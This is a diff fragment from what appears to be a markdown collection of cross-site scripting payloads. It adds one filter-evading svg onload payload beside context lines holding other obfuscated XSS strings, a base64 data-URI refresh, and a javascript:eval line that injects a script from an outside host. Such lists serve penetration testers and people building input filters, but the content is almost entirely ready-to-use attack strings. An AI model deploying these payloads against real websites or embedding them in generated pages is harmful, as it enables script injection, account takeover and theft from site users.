@@ -148,6 +148,7 @@ javascripT:eval('var a=document.createElement(\'script\'):a.src=\'https://ofjaaa
 %3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
 %3Cx%20y=1%20z=%271%26apos;%27onclick=self[`al`%2B`ert`](1)%3E%23CLICK%20MEE
 0%3Bdata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgUE9DbCIpPC9zY3JpcHQ%22HTTP-EQUIV%3D%22refresh%22
+xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 ```
 
 ## XSS + SSRF <br>
